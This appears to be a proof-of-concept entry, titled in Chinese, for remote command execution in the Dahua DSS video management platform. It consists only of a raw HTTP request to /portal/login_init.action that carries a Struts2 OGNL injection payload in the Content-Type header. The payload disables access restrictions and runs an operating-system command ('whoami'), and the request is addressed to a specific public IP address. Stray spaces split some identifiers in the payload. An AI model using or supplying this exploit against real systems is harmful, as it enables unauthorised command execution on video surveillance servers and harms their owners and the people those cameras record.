# 大华 DSS 视频管理平台 portal login_init.action 远程命令执行

    ```
POST /portal/login_init.action 
HTTP/1.1 
Host: 58.211.153.94:81 
Content-Length: 283
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://127.0.0.1:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Content-Type: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_ memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#c ontainer.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().cl ear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@jav a.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/ bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.S ervletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z 
Referer: http://127.0.0.1:8080/struts2-showcase/fileupload/upload.action 
Accept-Language: zh-CN,zh;q=0.8
Cookie: JSESSIONID=8B365C019F676093D27D8C0D21439C2B
Connection: close

------WebKitFormBoundaryXx80aU0pu6vrsV3z 
Content-Disposition: form-data; name="upload"; filename="2.txt" 
Content-Type: text/plain

asd 
------WebKitFormBoundaryXx80aU0pu6vrsV3z 
Content-Disposition: form-data; name="caption"

1 
------WebKitFormBoundaryXx80aU0pu6vrsV3z—
```
